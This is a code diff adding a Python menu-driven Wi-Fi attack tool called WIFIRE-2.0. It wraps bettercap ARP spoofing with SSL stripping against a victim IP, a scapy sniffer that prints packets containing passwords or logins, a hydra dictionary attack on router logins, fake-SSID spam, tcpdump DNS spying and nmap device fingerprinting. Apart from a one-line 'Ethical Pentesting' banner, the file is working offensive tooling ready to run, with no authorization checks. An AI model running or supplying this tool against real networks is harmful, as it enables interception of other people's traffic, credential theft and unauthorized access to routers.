@@ -1,0 +1,358 @@
+import subprocess
+import sys
+import re
+import signal
+from scapy.all import sniff, Raw, IP, TCP
+
+# Store attacked devices (to reset ARP later)
+attacked_devices = []
+interface = "wlp0s20f3"  # Set your Wi-Fi interface
+
+
+def run_command(command):
+    """Run a shell command and return the output."""
+    try:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        return result.stdout.strip()
+    except Exception as e:
+        return f"Error: {e}"
+
+
+def get_wifi_interface():
+    """Find the correct Wi-Fi interface."""
+    output = run_command("iw dev")
+    interfaces = re.findall(r"Interface (\S+)", output)
+
+    wifi_interfaces = [iface for iface in interfaces if not iface.startswith("en") and iface != "lo"]
+
+    if "wlp0s20f3" in wifi_interfaces:
+        return "wlp0s20f3"  # Use preferred interface if available
+    elif wifi_interfaces:
+        return wifi_interfaces[0]  # Return first detected Wi-Fi interface
+    else:
+        print("[!] No Wi-Fi interface detected. Try running as sudo.")
+        sys.exit(1)
+
+
+def scan_wifi(interface):
+    """Scan for available Wi-Fi networks using iw."""
+    print(f"[*] Scanning for Wi-Fi networks on {interface}...")
+
+    output = run_command(f"sudo iw dev {interface} scan")
+
+    if not output:
+        print("[!] No networks found or scan failed. Try running with sudo.")
+        return
+
+    networks = re.findall(r"SSID: (.+)", output)
+
+    if networks:
+        print("\n[+] Available Networks:")
+        for i, ssid in enumerate(sorted(set(networks)), 1):
+            print(f"  {i}. {ssid}")
+    else:
+        print("[!] No SSIDs found.")
+
+
+def restore_network():
+    """Restore ARP tables when the script exits."""
+    global attacked_devices
+    if attacked_devices:
+        print("\n[*] Restoring network settings...")
+        for target_ip, gateway_ip in attacked_devices:
+            run_command(f"sudo bettercap -iface {interface} -eval 'clear; arp.spoof off'")
+        print("[+] Network restored.")
+    sys.exit(0)
+
+
+def mitm_attack(interface):
+    """Perform ARP spoofing and SSL stripping."""
+    global attacked_devices
+
+    print("\n[*] Starting MITM Attack...")
+
+    target_ip = input("[?] Enter target IP (victim's device): ").strip()
+    gateway_ip = input("[?] Enter gateway IP (router IP): ").strip()
+
+    if not target_ip or not gateway_ip:
+        print("[!] Invalid input. MITM attack canceled.")
+        return
+
+    print(f"[*] Spoofing ARP: {target_ip} ⇄ {gateway_ip}")
+
+    # Store for restoration later
+    attacked_devices.append((target_ip, gateway_ip))
+
+    # Start ARP spoofing + SSL stripping
+    try:
+        subprocess.Popen(
+            f"sudo bettercap -iface {interface} -eval 'set arp.spoof.targets {target_ip}; arp.spoof on; set https.proxy.sslstrip true; https.proxy on'",
+            shell=True
+        )
+        print("[+] MITM + SSL Stripping started. Press CTRL+C to stop.")
+        print("[*] Now starting packet sniffing...")
+
+        # Start sniffing packets
+        sniff_packets(interface)
+
+    except Exception as e:
+        print(f"[!] Error starting MITM attack: {e}")
+
+
+def packet_callback(packet):
+    """Process sniffed packets and extract useful info."""
+    if packet.haslayer(Raw):
+        raw_data = packet[Raw].load.decode(errors="ignore")
+
+        # Detect passwords and logins
+        if "password" in raw_data.lower() or "login" in raw_data.lower():
+            print(f"\n[!!!] Possible Credential Found: {raw_data}")
+
+        # Print all HTTP requests (if any)
+        if packet.haslayer(TCP) and packet.haslayer(IP):
+            src_ip = packet[IP].src
+            dst_ip = packet[IP].dst
+            print(f"[*] {src_ip} -> {dst_ip} | Data: {raw_data}")
+
+
+def sniff_packets(interface):
+    """Start sniffing packets on the network."""
+    print("[*] Sniffing network traffic... Press CTRL+C to stop.")
+    try:
+        sniff(iface=interface, prn=packet_callback, store=False)
+    except KeyboardInterrupt:
+        print("\n[*] Stopping sniffing...")
+        restore_network()
+
+
+def brute_force_router():
+    """Brute-force the router's login using a dictionary attack."""
+    router_ip = input("[?] Enter the router's IP address (e.g., 192.168.1.1): ").strip()
+    username = input("[?] Enter the router's login username (usually 'admin' or 'user'): ").strip()
+    wordlist = input("[?] Enter the path to the password wordlist file: ").strip()
+
+    if not router_ip or not username or not wordlist:
+        print("[!] Invalid input. Attack canceled.")
+        return
+
+    print(f"[*] Starting dictionary attack on {router_ip} with user '{username}'...")
+
+    command = f"hydra -l {username} -P {wordlist} {router_ip} http-form-post '/login:username=^USER^&password=^PASS^:F=incorrect'"
+
+    try:
+        result = run_command(command)
+        print(result)
+    except KeyboardInterrupt:
+        print("\n[*] Attack stopped.")
+
+
+def nuclei_scan():
+    """Run an automated vulnerability scan using Nuclei."""
+    target_ip = input("[?] Enter target IP or domain for scanning: ").strip()
+
+    if not target_ip:
+        print("[!] Invalid target. Scan canceled.")
+        return
+
+    print(f"[*] Scanning {target_ip} with Nuclei...")
+
+    command = f"nuclei -u {target_ip} -silent"
+
+    try:
+        result = run_command(command)
+        print(result if result else "[+] Scan completed. No issues found.")
+    except KeyboardInterrupt:
+        print("\n[*] Scan interrupted.")
+
+import time
+from scapy.all import ARP, Ether, srp
+import subprocess
+import time
+
+def ssid_spam():
+    print("\n[SSID Spam] Press Enter for default names or type 20 custom SSIDs separated by commas:")
+    user_input = input(">> ").strip()
+
+    if user_input == "":
+        ssids = [
+            "FBI_Van_42", "NSA_Surveillance", "Hacker_Inside", "Virus_Spreading", "Illegal_Network",
+            "Pentest_Lab", "SkidNet", "Free_VPN_Please", "CIA_Secret", "DDoS_Master",
+            "MrRobot_Proxy", "DarkWeb_Entry", "Hackers_Loft", "Bruteforce_AP", "DeepState_WiFi",
+            "AnonymousHQ", "PacketSniffer", "Phishing_Hotspot", "Trojan_5G", "CyberWarfare_Net"
+        ]
+    else:
+        ssids = [name.strip() for name in user_input.split(",")]
+        if len(ssids) != 20:
+            print("[Error] You must enter exactly 20 SSIDs!")
+            return
+
+    print("\n[+] Creating 20 Fake Wi-Fi Networks...")
+
+    for ssid in ssids:
+        try:
+            subprocess.Popen(["nmcli", "device", "wifi", "hotspot", "ifname", "wlp0s20f3", "ssid", ssid, "password", "12345678"])
+            time.sleep(0.5)  # Delay to prevent overwhelming the system
+            print(f"[*] Fake SSID created: {ssid}")
+        except Exception as e:
+            print(f"[Error] Failed to create {ssid}: {e}")
+
+    print("\n[+] SSID Spam is Active! Use 'nmcli connection delete' to remove networks manually.")
+
+
+
+
+
+import subprocess
+import re
+
+def spy_dns():
+    print("\n[+] Capturing DNS Requests (Press Ctrl+C to stop)...")
+
+    # Run tcpdump to capture only DNS queries (port 53)
+    process = subprocess.Popen(
+        ["sudo", "tcpdump", "-l", "-i", "wlp0s20f3", "udp port 53"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.DEVNULL,
+        text=True
+    )
+
+    try:
+        # Read real-time output line by line
+        for line in process.stdout:
+            domain_match = re.search(r'\? (.*?)\.', line)
+            if domain_match:
+                domain = domain_match.group(1)
+                print(f"\033[1;36m[DNS] {domain}\033[0m")  # Cyan output
+    except KeyboardInterrupt:
+        print("\n[+] Stopping DNS capture.")
+        process.terminate()
+
+
+import subprocess
+import re
+
+
+def get_local_network():
+    """Get the local network IP range (e.g., 192.168.1.0/24)"""
+    try:
+        result = subprocess.run(["ip", "route"], capture_output=True, text=True)
+        match = re.search(r"(\d+\.\d+\.\d+\.\d+)/\d+", result.stdout)
+        if match:
+            return match.group(1) + "/24"
+        else:
+            print("[Error] Could not determine local network range.")
+            return None
+    except Exception as e:
+        print(f"[Error] Failed to get network info: {e}")
+        return None
+
+
+def device_fingerprint():
+    """Scan the network for devices and detect their OS and vendor."""
+    print("\n[+] Scanning network for connected devices...\n")
+
+    network_range = get_local_network()
+    if not network_range:
+        return
+
+    try:
+        # Step 1: Use arp-scan to list connected devices
+        arp_output = subprocess.run(["arp-scan", "-l"], capture_output=True, text=True).stdout
+
+        devices = []
+        for line in arp_output.split("\n"):
+            match = re.search(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9A-Fa-f:]+)\s+(.+)", line)
+            if match:
+                ip, mac, vendor = match.groups()
+                devices.append((ip, mac, vendor))
+
+        if not devices:
+            print("[!] No devices found on the network.")
+            return
+
+        print("\n[+] Found Devices:\n")
+        for ip, mac, vendor in devices:
+            print(f"  📡 {ip} - {vendor.strip()} [{mac}]")
+
+        print("\n[+] Running OS detection...\n")
+
+        # Step 2: Use nmap to guess the OS
+        for ip, _, _ in devices:
+            try:
+                nmap_output = subprocess.run(["nmap", "-O", ip], capture_output=True, text=True).stdout
+                os_match = re.search(r"OS details:\s+(.+)", nmap_output)
+                os_guess = os_match.group(1) if os_match else "Unknown OS"
+                print(f"  💻 {ip} - {os_guess}")
+            except Exception as e:
+                print(f"[Error] Failed to scan {ip}: {e}")
+
+        print("\n[+] Device fingerprinting complete!")
+
+    except Exception as e:
+        print(f"[Error] Failed to scan network: {e}")
+
+def interactive_shell():
+    """Main interactive terminal loop."""
+    global interface
+    interface = get_wifi_interface()
+
+    while True:
+        print("\033[1;32m")  # Set text color to bright green
+        print("\n" + "=" * 30)
+        print("     WIFIRE-2.0 BETA".center(30))
+        print("=" * 30)
+        print("\033[0m")  # Reset text color
+
+        # ASCII Art Banner
+        print("\033[1;31m")  # Set text color to bright red
+        print("""
+▄█     █▄   ▄█     ▄████████  ▄█     ▄████████    ▄████████ 
+███     ███ ███    ███    ███ ███    ███    ███   ███    ███ 
+███     ███ ███▌   ███    █▀  ███▌   ███    ███   ███    █▀  
+███     ███ ███▌  ▄███▄▄▄     ███▌  ▄███▄▄▄▄██▀  ▄███▄▄▄     
+███     ███ ███▌ ▀▀███▀▀▀     ███▌ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     
+███     ███ ███    ███        ███  ▀███████████   ███    █▄  
+███ ▄█▄ ███ ███    ███        ███    ███    ███   ███    ███ 
+ ▀███▀███▀  █▀     ███        █▀     ███    ███   ██████████ 
+                                     ███    ███              
+        """)
+        print("\033[0m")  # Reset text color
+
+        print("\033[1;32m[1]\033[0m Scan Wi-Fi Networks")
+        print("\033[1;32m[2]\033[0m Start MITM Attack (ARP Spoofing + Sniffing + SSL Stripping)")
+        print("\033[1;32m[3]\033[0m Brute-force Router Login (Dictionary Attack)")
+        print("\033[1;32m[4]\033[0m Run Nuclei Vulnerability Scan")
+        print("\033[1;32m[5]\033[0m SSID Spam Mode (Fake Wi-Fi Networks)")
+        print("\033[1;32m[6]\033[0m Passive Wi-Fi Traffic Analysis (DNS Spy)")
+        print("\033[1;32m[7]\033[0m Device Fingerprinting (Find Devices & OS on the Network)")  # New feature
+        print("\033[1;32m[8]\033[0m Exit")  # Exit moved to last
+
+        choice = input("\n\033[1;32m[?] Select an option:\033[0m ").strip()
+
+        if choice == "1":
+            scan_wifi(interface)
+        elif choice == "2":
+            mitm_attack(interface)
+        elif choice == "3":
+            brute_force_router()
+        elif choice == "4":
+            nuclei_scan()
+        elif choice == "5":
+            ssid_spam()
+        elif choice == "6":  # Passive Traffic Analysis feature
+            spy_dns()
+        elif choice == "7":  # Device Fingerprinting feature
+            device_fingerprint()
+        elif choice == "8":  # Exit option now last
+            restore_network()
+        else:
+            print("\033[1;31m[!] Invalid option. Try again.\033[0m")  # Red text for errors
+
+
+if __name__ == "__main__":
+    # Restore network on exit
+    signal.signal(signal.SIGINT, lambda sig, frame: restore_network())
+
+    print("[*] Ethical Pentesting Shell Started.")
+    print("[*] Detecting Wi-Fi interface...")
+    interactive_shell()
